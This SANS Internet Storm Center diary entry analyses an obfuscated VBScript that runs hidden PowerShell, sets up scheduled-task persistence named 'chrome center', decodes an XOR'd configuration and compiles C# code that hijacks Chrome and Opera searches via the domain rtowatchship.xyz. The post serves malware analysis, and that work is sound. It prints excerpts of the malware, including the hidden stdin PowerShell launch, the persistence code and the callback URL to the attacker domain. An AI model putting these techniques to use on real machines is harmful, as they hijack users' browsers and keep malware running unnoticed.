---
title: Multi-Technology Script Leading to Browser Hijacking, (Fri, Mar 10th)
url: https://isc.sans.edu/diary/rss/29620
source: SANS Internet Storm Center, InfoCON: green
date: 2023-03-11
fetch_date: 2025-10-04T09:17:48.091281
---

# Multi-Technology Script Leading to Browser Hijacking, (Fri, Mar 10th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29618)
* [next](/diary/29624)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Multi-Technology Script Leading to Browser Hijacking](/forums/diary/MultiTechnology%2BScript%2BLeading%2Bto%2BBrowser%2BHijacking/29620/)

**Published**: 2023-03-10. **Last Updated**: 2023-03-10 07:09:14 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[1 comment(s)](/diary/MultiTechnology%2BScript%2BLeading%2Bto%2BBrowser%2BHijacking/29620/#comments)

In the FOR610[[1](https://for610.com)] class, we learn how to perform malware analysis. The training focuses on Windows PE files but in the real world, malware samples use multiple technologies to perform malicious actions. I spotted a VBScript file (I don’t know where it’s coming from, probably a phishing campaign). The script has been flagged by only one(!) AV product on VT (SHA256: 81e4e91b8a841311b28b42951d53ec6ce471227480ca97c91c2aa1eeda6dad30[[2](https://bazaar.abuse.ch/sample/81e4e91b8a841311b28b42951d53ec6ce471227480ca97c91c2aa1eeda6dad30/)]).

The VBScript implements a simple but effective obfuscation technique: The attacker implemented search/replace operations to inject extra code into the script. Example:

```

1: pr = "WyI2NTM0ODcxMTQx ... VRHZFhTMGslM0QiXQ=="
2: pls = db64("DQoNCiRqX1Zhcj0kbnVsbDsNCiRvaz0kdHJ … JCX0NCgkJfQ0KDQoJfSBjYXRjaHt9DQp9DQoNCg==")
3: pls = Replace(pls, db64("cmVwbGFjZV9wYXJhbQ=="), pr)
4: pls = Replace(eb64(pls), vbLf, "")
```

The variable "pls" contains the Base64-encoded PowerShell scripts, and, on line 3, the string “replace\_param” ("cmVwbGFjZV9wYXJhbQ==") is replaced with a Base64-encoded data in the variable 'pr'. Here are the very first lines of the initial script:

```

1: $j_Var=$null;
2: $ok=$true
3: $rLD_v = "29";
4: $VRPar = "replace_param";
5: $ascEnC_str=[System.Text.Encoding]::ASCII;
```

The added data is a simple array:

```

["6534871141755962984",1678332192,"OTEwODQPBAMMDA4AAQwFDgQFAQILCAgMSAAEBQ8MCk0BDgMBAgMKBQAATGdXS0k%3D"]
```

This array is used here in the PowerShell script:

```

1: $j_Var=$ascEnC_str.GetString([System.Convert]::FromBase64String($VRPar)) | ConvertFrom-Json;
2: $di=$j_Var[2];
3: $is=$j_Var[1];
4: $u=$j_Var[0];
```

The deobfuscated code is now located in $pls. This code is injected into another script using the same technique:

```

1: cts = db64("JGQ9InJlcGxhY2VfcGx1YjY0IjsNCiR0YS ... CAgIH0gY2F0Y2h7fQ0KfQ0KDQpleGl0Ow==")
2: cts = Replace(cts, db64("cmVwbGFjZV9wbHViNjQ="), pls)
```

The PowerShell is launched via a nice trick:

```

1: Set so = CreateObject("WScript.Shell")
2: set ex = so.Exec(db64("Y21kLmV4ZSAvYyBwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLQ=="))
3: ex.StdIn.Write cts & VbCrLf
```

“Y21kLmV4ZSAvYyBwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLQ==“ decodes as “cmd.exe /c powershell -WindowStyle Hidden -“.

Did you see the trailing dash? PowerShell expects the code to execute from STDIN, see line 3.

This PowerShell script will implement its persistence via a scheduled task:

```

 1: $d="replace_plub64";
 2: $ta = New-ScheduledTaskAction -Execute 'cmd' -Argument "/c powershell -WindowStyle Hidden -E `"$d`"";
 3: $tt = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(45) -RepetitionInterval (New-TimeSpan -Minutes 50);
 4: Register-ScheduledTask -TaskName "chrome center" -Action $ta -Trigger $tt -Description "Chrome center";
 5: $tsn = @("engine", "policy", "about", "sync", "customize", "accessibility", "data", "help", "find", "zoom", "profile", "nav", "glass", "control", "window", "panel", "tab", "view", "cast", "history", "flags", "bookmarks", "conf", "storage", "tools",  "settings", "support", "tele")
 6: for ($i=0 ; $i -lt $tsn.length ; ++$i) {
 7:    try {
 8:       $ts = "chrome {0}" -f $tsn[$i];
 9:       Unregister-ScheduledTask -TaskName $ts -Confirm:$false
10:    } catch{}
11: }
12: exit;
```

Note that the script removes scheduled tasks based on the same naming convention.

Let’s now have a look at the variable "$d" which contains the payload executed by the scheduled task!

The PowerShell contains some CSharp code that is compiled on the fly:

```

csc.exe /noconfig /fullpaths @"C:\Users\user01\AppData\Local\Temp\z2fptyrq.cmdline"
```

Here are the compilation details extracted from the file z2fptyrq.cmdline:

```

\xfeff/t:library /utf8output /R:"System.dll"
/R:"C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"
/R:"C:\Windows\assembly\GAC_32\System.Web\2.0.0.0__b03f5f7f11d50a3a\System.Web.dll" /R:"Microsoft.CSharp.dll"
/R:"C:\Windows\assembly\GAC_32\PresentationCore\3.0.0.0__31bf3856ad364e35\PresentationCore.dll"
/R:"C:\Windows\assembly\GAC_MSIL\WindowsBase\3.0.0.0__31bf3856ad364e35\WindowsBase.dll"
/out:"C:\Users\user01\AppData\Local\Temp\z2fptyrq.dll"
/D:DEBUG /debug+ /optimize- "C:\Users\user01\AppData\Local\Temp\z2fptyrq.0.cs”
```

Here is the PowerShell code:

```

1: $id = get-random
2: $assemblies = ("System.Web", "Microsoft.CSharp", "PresentationCore", "WindowsBase")
3: $code = @" ... "@
4: Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp -IgnoreWarnings
5: $fr = "[Application.Program$id]::run";
6: $fs = "[Application.Program$id]::stop";
```

More runtime parameters are obfuscated in an XOR’d string:

```

1: $eb=[System.Convert]::FromBase64String("RUVwSTMeZxMhQSooFRZQICsELE ... MqNRU7UmsgCCwTahFSFA==");
2: $k=$eb[0..4];
3: $bs=$eb[5..$eb.length];
4: $rs=@();
5: $j=0;
6: [array]::Resize([ref]$rs,$bs.length);
7: foreach($b in $bs) {$rs[$j++]=($b -bxor $k[$j%$k.length])}
8: $ja=$a.GetString($rs) | ConvertFrom-Json;
```

The XOR key is based on the 4-first bytes of the "$eb" variable. Here is the content of "$ja":

```

 1: PS C:\Users\REM> $ja
 2: chrome_center
 3: background.js
 4: temp.zip
 5: rtowatchship.xyz
 6: name='chrome.exe'
 7: load-extension
 8: chrome
 9: C:\Program Files\
10: C:\Program Files (x86)\
11: Google\Chrome\Application\chrome.exe
12: opera
13: name='opera.exe'
14: Opera\launcher.exe
15: \Programs\
16: taskkill /F /IM opera.exe /T
```

It was impossible to detonate the complete script in my sandbox (and compile the CSHARP code)… However, the code discloses interesting behaviors:

```

 1: public static void run(string domain, string uid, string ist, string tid)
 2: {
 3:    if (thread != null && thread.IsAlive)
 4:    {
 5:        return;
 6:    }
 7:    isRun = true;
 8:    srvUrl = String.Format("https://goog.{0}/?tid={1}&u={2}&agec={3}", domain, tid, uid, ist);
 9:    thread = new Thread(new ThreadStart(Program88.runThread));
10:    thread.IsBackground = true;
11:    thread.SetApartmentState(ApartmentState.STA);
12:    thread.Start();
13: }
```

The domain comes from the XOR-encoded data above: rtowatchship[.]xyz. A browser is started and, at the end of the function laughing it, there is a reference to this function:

```

hookSearchNavigation(hwnd, valuePattern, searchKeyword, true, referrer)
```

Microsoft UI Automation is a tool that provides an abstracted model of the UI, and allows a client application to both investigate and manipulate the UI of all running applications on the system.

[Update] I was able to detonate the last piece of PowerShell script in my sandbox after some code cleanup, but there is no data returned by rtowatchship[.]xyz.I don't have lot of experience with UI Automation. If you can share some details about the CSharp code, please share with us!

[1] <https://for610.com>
[2] <https://bazaar.abuse.ch/sample/81e4e91b8a841311b28b42951d53ec6ce471227480ca97c91c2aa1eeda6dad30/>
...